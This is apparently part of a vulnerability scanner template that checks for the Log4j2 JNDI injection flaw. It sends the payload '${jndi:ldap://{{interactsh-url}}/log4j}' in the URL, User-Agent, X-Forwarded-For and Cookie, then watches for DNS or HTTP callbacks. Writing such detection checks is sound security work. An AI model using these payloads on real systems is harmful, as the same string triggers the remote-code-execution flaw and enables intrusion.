  author: cc-toolkit
  severity: critical
  description: Apache Log4j2 JNDI injection leading to unauthenticated RCE
  tags: cve, cve2021, log4j, rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?x=${jndi:ldap://{{interactsh-url}}/log4j}"
    headers:
      User-Agent: "${jndi:ldap://{{interactsh-url}}/log4j}"
      X-Forwarded-For: "${jndi:ldap://{{interactsh-url}}/log4j}"
      Cookie: "x=${jndi:ldap://{{interactsh-url}}/log4j}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
